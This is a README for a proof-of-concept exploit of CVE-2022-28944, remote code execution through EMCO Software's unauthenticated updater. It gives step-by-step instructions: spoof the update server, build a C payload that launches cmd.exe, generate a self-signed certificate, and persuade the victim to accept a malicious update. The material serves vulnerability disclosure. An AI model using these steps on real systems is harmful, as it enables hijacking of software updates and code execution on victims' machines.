# CVE-2022-28944
> EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability.

Usage: `python3 cve-2022-28944_poc.py`

Details in the report at [gerr.re](https://gerr.re/posts/cve-2022-28944/).

## Steps to reproduce
1. Install an affected product of EMCO Software;
2. Set spoof `storage.emcosoftware.com` to our attacker ip;
    * For a proof-of-concept edit `c:\windows\system32\drivers\etc\hosts` on target.
        - Note: attackers may e.g. use:
            + poorly configured routers/switches/DNS,
            + DNS spoof / cache poisoning,
            + ARP spoof / cache poisoning.
3. Compile `proof.c` on the attacker, e.g. using `i686-w64-mingw32-gcc proof.c -o proof.exe`;
```c
#include <windows.h>
int main(int argc, char const *argv[]){	
	WinExec("cmd.exe",1);
	return TRUE;
}
```
4. Generate self-signed certificates;
   * e.g. using `openssl req -new -x509 -keyout storage.emcosoftware.com.pem -out storage.emcosoftware.com.pem -days 365 -nodes -subj "/CN=storage.emcosoftware.com"`
5. Run the proof-of-concept script;
6. Start the affected product of EMCO Software and either
    * wait a day to trigger update automatically, or
    * trigger the update manually through the application menu;
7. Accept the update in the Update Wizard.
    * Attackers will use a persuasive update description to convince a target to accept the update.

